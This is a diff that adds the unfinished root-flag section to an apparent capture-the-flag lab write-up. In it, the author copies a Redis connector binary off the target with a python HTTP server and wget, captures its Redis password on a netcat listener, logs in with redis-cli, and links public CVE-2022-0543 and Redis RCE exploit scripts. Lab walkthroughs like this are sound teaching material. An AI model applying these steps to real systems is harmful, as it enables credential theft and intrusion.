@@ -220,3 +220,95 @@ We're now signed in as Dan Smith!!
 ```
 cat user.txt
 ```
+
+## Root Flag
+
+Okay so now we're in danny boy's system, so let's move up one more time and wrap up this machine!
+
+So earlier we found the linpeas dug up that Redis, a key-value based database, was readable by our user but owned by root.
+
+Like in questionable anime films, I think we know where this one is going. (;
+
+So I did some quick googling and turns out Redis sets it's username to default if there only a password configuration.
+
+After a bit more digging, I found a specific redis_connector_dev executable on the machine. 
+
+```
+file /usr/local/bin/redis_connector_dev
+/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
+```
+
+So my next goal was to get the redis_connector_dev binary onto my local machine. (I also discovered that python3 is running freely on the target so I can use that to transfer files)
+
+```
+cp /usr/local/bin/redis_connector_dev ./redis_connector_dev
+python3 -m http.server
+```
+
+Then from my attacking machine.
+
+```
+wget http://10.10.11.172:8000/redis_connector_dev
+```
+
+That brought the binary over to me.
+
+One thing I know about Redis is that it almost always runs on port 6379. So what if I spin up Redis and then snatch it?
+
+First, on one tab of my terminal I ran a netcat listener.
+
+```
+nc -lvp 6379
+```
+
+Then on the other, where the redis_connector_dev binary arrived, I ran it.
+
+```
+chmod +x redis_connector_dev
+./redis_connector_dev
+[+] Logging to redis instance using password...
+
+INFO command result:
+ dial tcp 127.0.0.1:6379: connect: connection refused
+```
+
+On my listener it outputed this:
+
+```
+Listening on 0.0.0.0 6379
+Connection received on localhost 55922
+*2
+$4
+auth
+$16
+F2WHqJUz2WEz=Gqq
+```
+
+It looks like I was able to intercept the authority call and retrieve the password (I think? We won't know until we run it).
+
+So it looks like here are the redis credentials:
+
+*default:F2WHqJUz2WEz=Gqq*
+
+I was then able to authenticate onto the redis server myself.
+
+```
+redis-cli
+127.0.0.1:6379> CONFIG SET requirepass F2WHqJUz2WEz=Gqq
+(error) NOAUTH Authentication required.
+127.0.0.1:6379> AUTH default F2WHqJUz2WEz=Gqq
+OK
+```
+
+Now I did find a script that seems pretty relevent, but I can install python modules exactly onto the target, so I'll be running the script virtually. https://raw.githubusercontent.com/aodsec/CVE-2022-0543/main/CVE-2022-0543.py
+
+That should be my last step to getting the root flag.
+
+That being said, I've had tons of issues trying to get this last part to follow through.
+
+I did find two more scripts that seemed promising and I managed to put them on the target and run them, so no depency issue like the other one... With that being said they don't work as intended.
+
+* https://github.com/Ridter/redis-rce 
+* https://github.com/n0b0dyCN/redis-rogue-server
+
+I think I will come back to this guy.
